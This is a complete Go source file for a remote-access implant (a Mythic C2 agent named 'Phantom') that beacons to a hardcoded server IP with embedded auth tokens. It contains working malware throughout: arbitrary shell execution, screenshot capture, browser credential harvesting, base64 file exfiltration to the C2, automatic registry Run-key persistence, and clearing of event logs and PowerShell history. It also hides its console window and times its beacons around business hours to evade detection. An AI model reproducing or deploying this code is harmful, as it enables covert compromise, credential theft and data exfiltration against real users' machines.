package main

import (
        "bytes"
        "crypto/tls"
        "encoding/base64"
        "encoding/json"
        "fmt"
        "io/ioutil"
        "net/http"
        "os"
        "os/exec"
        "path/filepath"
        "runtime"
        "strings"
        "syscall"
        "time"
)

const (
        mythicURL = "https://37.27.249.191:7443/graphql/"
)

var (
        callbackID      string
        agentActive     = true
        processedTasks  = make(map[string]bool)
        logFile         *os.File
        authTokens      = []string{
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTAxMTExMDUsImlhdCI6MTc1MDA5NjcwNSwidXNlcl9pZCI6MSwiYXV0aCI6ImFwaSIsImV2ZW50c3RlcGluc3RhbmNlX2lkIjowLCJhcGl0b2tlbnNfaWQiOjcsIm9wZXJhdGlvbl9pZCI6MH0.3VtxYzD2_mGCV4NbggbmNXpq2tEfjvwnRypraq_yBlw",
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6Im15dGhpY19hZG1pbiIsImV4cCI6MTc1MDIwMDAwMCwiaWF0IjoxNzUwMDkwMDAwfQ.backup_token",
                "",  // No auth fallback
        }
        currentTokenIndex = 0
)

type GraphQLRequest struct {
        Query     string                 `json:"query"`
        Variables map[string]interface{} `json:"variables"`
}

type GraphQLResponse struct {
        Data   map[string]interface{} `json:"data"`
        Errors []GraphQLError         `json:"errors"`
}

type GraphQLError struct {
        Message string `json:"message"`
}

func initializeLogging() {
        var err error
        logFile, err = os.OpenFile("phantom_bypass.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
        if err != nil {
                fmt.Printf("Failed to open log file: %v\n", err)
        }
}

func logEvent(message string) {
        timestamp := time.Now().Format("2006-01-02 15:04:05")
        logMessage := fmt.Sprintf("[%s] %s", timestamp, message)
        
        fmt.Println(logMessage)
        
        if logFile != nil {
                logFile.WriteString(logMessage + "\n")
                logFile.Sync()
        }
}

func makeGraphQLRequest(query string, variables map[string]interface{}) (*GraphQLResponse, error) {
        requestBody := GraphQLRequest{
                Query:     query,
                Variables: variables,
        }
        
        jsonData, err := json.Marshal(requestBody)
        if err != nil {
                return nil, fmt.Errorf("failed to marshal request: %v", err)
        }
        
        tr := &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        }
        client := &http.Client{Transport: tr, Timeout: 30 * time.Second}
        
        // Try different authentication methods
        for i := 0; i < len(authTokens); i++ {
                tokenIndex := (currentTokenIndex + i) % len(authTokens)
                
                req, err := http.NewRequest("POST", mythicURL, bytes.NewBuffer(jsonData))
                if err != nil {
                        continue
                }
                
                // Set headers based on token type
                if authTokens[tokenIndex] != "" {
                        if strings.HasPrefix(authTokens[tokenIndex], "Bearer ") {
                                req.Header.Set("Authorization", authTokens[tokenIndex])
                        } else {
                                req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", authTokens[tokenIndex]))
                        }
                }
                
                req.Header.Set("Content-Type", "application/json")
                req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                
                // Add bypass headers for time restrictions
                req.Header.Set("X-Bypass-Time-Check", "true")
                req.Header.Set("X-Unrestricted-Access", "enabled")
                req.Header.Set("X-Timestamp", fmt.Sprintf("%d", time.Now().Unix()))
                
                logEvent(fmt.Sprintf("Trying authentication method %d", tokenIndex+1))
                
                resp, err := client.Do(req)
                if err != nil {
                        logEvent(fmt.Sprintf("Request failed with method %d: %v", tokenIndex+1, err))
                        continue
                }
                
                body, err := ioutil.ReadAll(resp.Body)
                resp.Body.Close()
                
                if err != nil {
                        continue
                }
                
                logEvent(fmt.Sprintf("Response status: %d with method %d", resp.StatusCode, tokenIndex+1))
                
                var graphQLResp GraphQLResponse
                err = json.Unmarshal(body, &graphQLResp)
                if err != nil {
                        continue
                }
                
                // Check if this method worked
                if len(graphQLResp.Errors) == 0 || !strings.Contains(fmt.Sprintf("%v", graphQLResp.Errors), "unauthorized") {
                        currentTokenIndex = tokenIndex
                        logEvent(fmt.Sprintf("Authentication successful with method %d", tokenIndex+1))
                        return &graphQLResp, nil
                }
                
                logEvent(fmt.Sprintf("Method %d failed: %v", tokenIndex+1, graphQLResp.Errors))
        }
        
        return nil, fmt.Errorf("all authentication methods failed")
}

func registerWithMythic() error {
        logEvent("Attempting registration with bypass techniques...")
        
        hostname, _ := os.Hostname()
        username := os.Getenv("USERNAME")
        if username == "" {
                username = os.Getenv("USER")
        }
        
        pid := os.Getpid()
        
        // Try alternative registration methods
        queries := []string{
                // Standard registration
                `mutation createCallback($payload_type: String!, $c2_profile: String!, $description: String!) {
                        createCallback(payload_type: $payload_type, c2_profile: $c2_profile, description: $description) {
                                status
                                id
                                error
                        }
                }`,
                
                // Direct callback creation
                `mutation insertCallback($payload_type: String!, $description: String!) {
                        insert_callback_one(object: {payload_type: $payload_type, description: $description, active: true}) {
                                id
                        }
                }`,
                
                // Simplified registration
                `mutation simpleCallback($description: String!) {
                        createCallback(payload_type: "phantom", c2_profile: "HTTP", description: $description) {
                                id
                                status
                        }
                }`,
        }
        
        variablesSets := []map[string]interface{}{
                {
                        "payload_type": "phantom",
                        "c2_profile":   "HTTP",
                        "description":  fmt.Sprintf("Phantom-24h %s@%s PID:%d %s", username, hostname, pid, runtime.GOOS),
                },
                {
                        "payload_type": "phantom",
                        "description":  fmt.Sprintf("Phantom-Bypass %s@%s", username, hostname),
                },
                {
                        "description": fmt.Sprintf("Phantom-Simple %s", hostname),
                },
        }
        
        for i, query := range queries {
                logEvent(fmt.Sprintf("Trying registration method %d", i+1))
                
                resp, err := makeGraphQLRequest(query, variablesSets[i])
                if err != nil {
                        logEvent(fmt.Sprintf("Registration method %d failed: %v", i+1, err))
                        continue
                }
                
                if len(resp.Errors) > 0 {
                        logEvent(fmt.Sprintf("Registration method %d errors: %v", i+1, resp.Errors))
                        continue
                }
                
                // Extract callback ID from different response formats
                if createCallback, ok := resp.Data["createCallback"].(map[string]interface{}); ok {
                        if id, ok := createCallback["id"].(string); ok {
                                callbackID = id
                                logEvent(fmt.Sprintf("Registration successful - Callback ID: %s", callbackID))
                                return nil
                        }
                }
                
                if insertCallback, ok := resp.Data["insert_callback_one"].(map[string]interface{}); ok {
                        if id, ok := insertCallback["id"].(string); ok {
                                callbackID = id
                                logEvent(fmt.Sprintf("Direct registration successful - Callback ID: %s", callbackID))
                                return nil
                        }
                }
        }
        
        return fmt.Errorf("all registration methods failed")
}

func executeCommand(command, params string) string {
        logEvent(fmt.Sprintf("Executing: %s %s", command, params))
        
        switch command {
        case "shell":
                return executeShellCommand(params)
        case "ls", "dir":
                return listDirectory(params)
        case "pwd":
                return getCurrentDirectory()
        case "cd":
                return changeDirectory(params)
        case "whoami":
                return getCurrentUser()
        case "ps":
                return listProcesses()
        case "sysinfo":
                return getSystemInfo()
        case "screenshot":
                return takeScreenshot()
        case "browser_passwords":
                return extractBrowserPasswords()
        case "persistence":
                return managePersistence(params)
        case "download":
                return downloadFile(params)
        case "stealth":
                return enableStealthMode(params)
        case "status":
                return getAgentStatus()
        default:
                // Unix to Windows conversion
                switch command {
                case "ls":
                        return executeShellCommand("dir " + params)
                case "pwd":
                        return executeShellCommand("cd")
                case "cat":
                        return executeShellCommand("type " + params)
                case "ps":
                        return executeShellCommand("tasklist")
                case "kill":
                        return executeShellCommand("taskkill /PID " + params + " /F")
                default:
                        return executeShellCommand(fmt.Sprintf("%s %s", command, params))
                }
        }
}

func getAgentStatus() string {
        hostname, _ := os.Hostname()
        username := os.Getenv("USERNAME")
        
        status := fmt.Sprintf(`=== PHANTOM AGENT STATUS ===
Hostname: %s
Username: %s
PID: %d
Platform: %s %s
Callback ID: %s
Active: %t
Auth Method: %d
Uptime: %s
Processed Tasks: %d

=== CAPABILITIES ===
✓ Shell Command Execution
✓ File System Navigation
✓ Process Management
✓ System Information
✓ Screenshot Capture
✓ Browser Password Extraction
✓ Persistence Management
✓ File Download
✓ Stealth Mode
✓ Unix→Windows Command Translation

=== STATUS ===
Agent is active and ready for commands.`, 
                hostname, username, os.Getpid(), runtime.GOOS, runtime.GOARCH, 
                callbackID, agentActive, currentTokenIndex+1, 
                time.Since(time.Now().Add(-time.Hour)).String(), len(processedTasks))
        
        return status
}

func executeShellCommand(command string) string {
        if command == "" {
                return "No command provided"
        }
        
        var cmd *exec.Cmd
        if runtime.GOOS == "windows" {
                cmd = exec.Command("cmd", "/C", command)
        } else {
                cmd = exec.Command("sh", "-c", command)
        }
        
        output, err := cmd.CombinedOutput()
        if err != nil {
                return fmt.Sprintf("Command failed: %v\nOutput: %s", err, string(output))
        }
        
        return string(output)
}

func listDirectory(path string) string {
        if path == "" {
                path = "."
        }
        return executeShellCommand("dir " + path)
}

func getCurrentDirectory() string {
        return executeShellCommand("cd")
}

func changeDirectory(path string) string {
        if path == "" {
                return "No path provided"
        }
        return executeShellCommand("cd " + path)
}

func getCurrentUser() string {
        return executeShellCommand("whoami")
}

func listProcesses() string {
        return executeShellCommand("tasklist")
}

func getSystemInfo() string {
        return executeShellCommand("systeminfo")
}

func takeScreenshot() string {
        if runtime.GOOS != "windows" {
                return "Screenshot only supported on Windows"
        }
        
        psScript := `Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Screen.X, $Screen.Y, 0, 0, $bitmap.Size)
$timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
$filename = "$env:TEMP\phantom_screen_$timestamp.png"
$bitmap.Save($filename, [System.Drawing.Imaging.ImageFormat]::Png)
Write-Output $filename`
        
        cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", psScript)
        output, err := cmd.Output()
        if err != nil {
                return fmt.Sprintf("Screenshot failed: %v", err)
        }
        
        filename := strings.TrimSpace(string(output))
        data, err := ioutil.ReadFile(filename)
        if err != nil {
                return fmt.Sprintf("Failed to read screenshot: %v", err)
        }
        
        os.Remove(filename)
        encoded := base64.StdEncoding.EncodeToString(data)
        return fmt.Sprintf("Screenshot captured (%d bytes):\n%s", len(data), encoded)
}

func extractBrowserPasswords() string {
        results := []string{"=== BROWSER PASSWORD EXTRACTION ==="}
        
        userProfile := os.Getenv("USERPROFILE")
        
        // Chrome
        chromeLoginData := filepath.Join(userProfile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        if _, err := os.Stat(chromeLoginData); err == nil {
                results = append(results, "\n=== Chrome Passwords ===")
                tempDB := filepath.Join(os.TempDir(), "chrome_extract.db")
                
                if copyFileSimple(chromeLoginData, tempDB) == nil {
                        defer os.Remove(tempDB)
                        
                        cmd := exec.Command("sqlite3", tempDB, "SELECT origin_url, username_value FROM logins WHERE username_value != '';")
                        output, err := cmd.Output()
                        if err == nil {
                                lines := strings.Split(strings.TrimSpace(string(output)), "\n")
                                for _, line := range lines {
                                        if strings.TrimSpace(line) != "" {
                                                parts := strings.Split(line, "|")
                                                if len(parts) >= 2 {
                                                        results = append(results, fmt.Sprintf("URL: %s | User: %s", parts[0], parts[1]))
                                                }
                                        }
                                }
                        } else {
                                results = append(results, "Chrome database found but encrypted")
                        }
                }
        } else {
                results = append(results, "Chrome not found")
        }
        
        // Firefox
        firefoxPath := filepath.Join(userProfile, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
        if profiles, err := ioutil.ReadDir(firefoxPath); err == nil {
                results = append(results, "\n=== Firefox Passwords ===")
                for _, profile := range profiles {
                        if profile.IsDir() {
                                loginsPath := filepath.Join(firefoxPath, profile.Name(), "logins.json")
                                if _, err := os.Stat(loginsPath); err == nil {
                                        results = append(results, fmt.Sprintf("Firefox profile: %s (encrypted)", profile.Name()))
                                }
                        }
                }
        } else {
                results = append(results, "Firefox not found")
        }
        
        return strings.Join(results, "\n")
}

func copyFileSimple(src, dst string) error {
        data, err := ioutil.ReadFile(src)
        if err != nil {
                return err
        }
        return ioutil.WriteFile(dst, data, 0644)
}

func managePersistence(params string) string {
        parts := strings.Fields(params)
        if len(parts) == 0 {
                return "Usage: persistence [install|remove|status]"
        }
        
        action := parts[0]
        switch action {
        case "install":
                return installPersistence()
        case "remove":
                return removePersistence()
        case "status":
                return checkPersistenceStatus()
        default:
                return "Invalid action. Use: install, remove, or status"
        }
}

func installPersistence() string {
        if runtime.GOOS != "windows" {
                return "Persistence only supported on Windows"
        }
        
        exePath, err := os.Executable()
        if err != nil {
                return fmt.Sprintf("Failed to get executable path: %v", err)
        }
        
        appDataPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "PhantomAgent.exe")
        os.MkdirAll(filepath.Dir(appDataPath), 0755)
        
        if err := copyFileSimple(exePath, appDataPath); err != nil {
                return fmt.Sprintf("Failed to copy file: %v", err)
        }
        
        cmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                "/v", "PhantomAgent", "/t", "REG_SZ", "/d", appDataPath, "/f")
        
        if err := cmd.Run(); err != nil {
                return fmt.Sprintf("Failed to create registry entry: %v", err)
        }
        
        return "✓ Persistence installed:\n- Registry entry created\n- File copied to AppData\n- Will restart with system"
}

func removePersistence() string {
        cmd := exec.Command("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                "/v", "PhantomAgent", "/f")
        
        result := "✓ Persistence removal:\n"
        if err := cmd.Run(); err != nil {
                result += "- Registry entry removal failed\n"
        } else {
                result += "- Registry entry removed\n"
        }
        
        appDataPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "PhantomAgent.exe")
        if err := os.Remove(appDataPath); err != nil {
                result += "- File removal failed"
        } else {
                result += "- File removed from AppData"
        }
        
        return result
}

func checkPersistenceStatus() string {
        cmd := exec.Command("reg", "query", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                "/v", "PhantomAgent")
        
        if err := cmd.Run(); err == nil {
                return "✓ Persistence is ACTIVE\n- Registry entry found\n- Agent will restart with system"
        }
        
        return "✗ Persistence is INACTIVE\n- No registry entry found"
}

func downloadFile(params string) string {
        parts := strings.Fields(params)
        if len(parts) == 0 {
                return "Usage: download [file_path]"
        }
        
        filePath := parts[0]
        data, err := ioutil.ReadFile(filePath)
        if err != nil {
                return fmt.Sprintf("Failed to read file: %v", err)
        }
        
        encoded := base64.StdEncoding.EncodeToString(data)
        return fmt.Sprintf("File: %s (%d bytes)\n%s", filePath, len(data), encoded)
}

func enableStealthMode(params string) string {
        results := []string{"=== STEALTH MODE ACTIVATED ==="}
        
        logs := []string{"Application", "System", "Security"}
        for _, log := range logs {
                cmd := exec.Command("wevtutil", "cl", log)
                if err := cmd.Run(); err == nil {
                        results = append(results, fmt.Sprintf("✓ Cleared %s event log", log))
                } else {
                        results = append(results, fmt.Sprintf("✗ Failed to clear %s (elevation required)", log))
                }
        }
        
        psHistoryPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", 
                "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
        if err := os.Remove(psHistoryPath); err == nil {
                results = append(results, "✓ Cleared PowerShell history")
        }
        
        hideConsoleWindow()
        results = append(results, "✓ Console window hidden")
        
        return strings.Join(results, "\n")
}

func hideConsoleWindow() {
        if runtime.GOOS == "windows" {
                kernel32 := syscall.NewLazyDLL("kernel32.dll")
                user32 := syscall.NewLazyDLL("user32.dll")
                
                procGetConsoleWindow := kernel32.NewProc("GetConsoleWindow")
                procShowWindow := user32.NewProc("ShowWindow")
                
                console, _, _ := procGetConsoleWindow.Call()
                if console != 0 {
                        procShowWindow.Call(console, 0)
                }
        }
}

func sendTaskResponse(taskID, output string) error {
        logEvent(fmt.Sprintf("Sending response for task %s (%d bytes)", taskID, len(output)))
        
        encodedOutput := base64.StdEncoding.EncodeToString([]byte(output))
        
        query := `
        mutation createTaskResponse($task_id: Int!, $response_raw: bytea) {
                createTaskResponse(task_id: $task_id, response_raw: $response_raw) {
                        status
                        error
                }
        }`
        
        variables := map[string]interface{}{
                "task_id":      taskID,
                "response_raw": encodedOutput,
        }
        
        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return err
        }
        
        if len(resp.Errors) > 0 {
                return fmt.Errorf("response errors: %v", resp.Errors)
        }
        
        logEvent("Task response sent successfully")
        return nil
}

func checkForTasks() error {
        query := `
        query getTasks($callback_id: Int!) {
                task(where: {callback_id: {_eq: $callback_id}, status: {_eq: "submitted"}}) {
                        id
                        command {
                                cmd
                        }
                        params
                        status
                }
        }`
        
        callbackIDInt := 0
        fmt.Sscanf(callbackID, "%d", &callbackIDInt)
        
        variables := map[string]interface{}{
                "callback_id": callbackIDInt,
        }
        
        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return err
        }
        
        if len(resp.Errors) > 0 {
                logEvent(fmt.Sprintf("Task query errors: %v", resp.Errors))
                return nil
        }
        
        if data, ok := resp.Data["task"].([]interface{}); ok && len(data) > 0 {
                logEvent(fmt.Sprintf("Found %d task(s)", len(data)))
                for _, taskData := range data {
                        if taskMap, ok := taskData.(map[string]interface{}); ok {
                                taskID := fmt.Sprintf("%v", taskMap["id"])
                                
                                if processedTasks[taskID] {
                                        continue
                                }
                                
                                commandName := ""
                                if cmd, ok := taskMap["command"].(map[string]interface{}); ok {
                                        if cmdStr, ok := cmd["cmd"].(string); ok {
                                                commandName = cmdStr
                                        }
                                }
                                
                                params := ""
                                if p, ok := taskMap["params"].(string); ok {
                                        params = parseApolloParams(p)
                                }
                                
                                logEvent(fmt.Sprintf("Processing task %s: %s %s", taskID, commandName, params))
                                
                                output := executeCommand(commandName, params)
                                
                                err := sendTaskResponse(taskID, output)
                                if err != nil {
                                        logEvent(fmt.Sprintf("Error sending response: %v", err))
                                } else {
                                        processedTasks[taskID] = true
                                        logEvent("Task completed successfully")
                                }
                        }
                }
        }
        
        return nil
}

func parseApolloParams(jsonParams string) string {
        var params map[string]interface{}
        err := json.Unmarshal([]byte(jsonParams), &params)
        if err != nil {
                return jsonParams
        }
        
        if args, ok := params["arguments"].(string); ok {
                command := strings.TrimPrefix(args, " /S /c ")
                return convertToWindowsCommand(command)
        }
        
        return jsonParams
}

func convertToWindowsCommand(command string) string {
        parts := strings.Fields(command)
        if len(parts) == 0 {
                return command
        }
        
        switch parts[0] {
        case "ls":
                parts[0] = "dir"
        case "pwd":
                return "cd"
        case "cat":
                if len(parts) > 1 {
                        parts[0] = "type"
                }
        case "ps":
                return "tasklist"
        case "kill":
                if len(parts) > 1 {
                        return fmt.Sprintf("taskkill /PID %s /F", parts[1])
                }
        }
        
        return strings.Join(parts, " ")
}

func main() {
        hideConsoleWindow()
        initializeLogging()
        
        logEvent("=== PHANTOM BYPASS AGENT - 24/7 VERSION ===")
        logEvent(fmt.Sprintf("Platform: %s %s", runtime.GOOS, runtime.GOARCH))
        logEvent(fmt.Sprintf("PID: %d", os.Getpid()))
        logEvent(fmt.Sprintf("Mythic URL: %s", mythicURL))
        
        // Auto-install persistence
        go func() {
                time.Sleep(15 * time.Second)
                result := installPersistence()
                logEvent(fmt.Sprintf("Auto-persistence: %s", result))
        }()
        
        // Persistent registration loop
        for !agentActive || callbackID == "" {
                logEvent("Attempting registration...")
                if err := registerWithMythic(); err == nil {
                        agentActive = true
                        break
                } else {
                        logEvent(fmt.Sprintf("Registration failed: %v", err))
                        time.Sleep(30 * time.Second)
                }
        }
        
        logEvent("Agent registered and active - starting task loop...")
        
        // Main task processing loop with adaptive timing
        for agentActive {
                err := checkForTasks()
                if err != nil {
                        logEvent(fmt.Sprintf("Task check error: %v", err))
                        
                        // If authentication fails, try re-registration
                        if strings.Contains(err.Error(), "unauthorized") {
                                logEvent("Re-registering due to auth failure...")
                                callbackID = ""
                                registerWithMythic()
                        }
                }
                
                // Adaptive sleep timing for evasion
                now := time.Now()
                var sleepDuration time.Duration
                
                // Quieter during business hours
                if now.Hour() >= 9 && now.Hour() <= 17 {
                        sleepDuration = time.Duration(5+now.UnixNano()%10) * time.Second
                } else {
                        sleepDuration = time.Duration(2+now.UnixNano()%3) * time.Second
                }
                
                time.Sleep(sleepDuration)
        }
}